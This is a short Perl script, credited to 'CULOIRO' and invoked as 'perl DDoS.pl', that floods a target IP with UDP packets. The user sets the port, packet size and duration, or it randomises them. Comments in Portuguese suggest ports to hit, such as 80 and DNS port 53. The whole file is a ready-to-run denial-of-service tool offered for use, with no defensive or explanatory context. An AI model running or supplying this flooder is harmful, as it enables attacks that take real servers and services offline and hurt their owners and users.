#!/usr/bin/perl
 
#Created by .CULOIRO
#Port - Use '80' Para Pessoas ou Porta 53 Para DNS Ou 8090 Para Site
#Size - Use '100 - 1000' (Reccomended).
 
use Socket;
use strict;
 
print '
';
print "\n";
 
 
if ($#ARGV != 3) {
  print "\n\t\t\t..:CREATED BY CULOIRO:..\n";
  print "\n\t\t\tperl DDoS.pl IP 80 1000 300\n";
  print "\n\t\t\t..:CREATED BY CULOIRO:..\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~To cancel the attack press \'Ctrl-C\'\n\n";
print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "To cancel the attack press 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
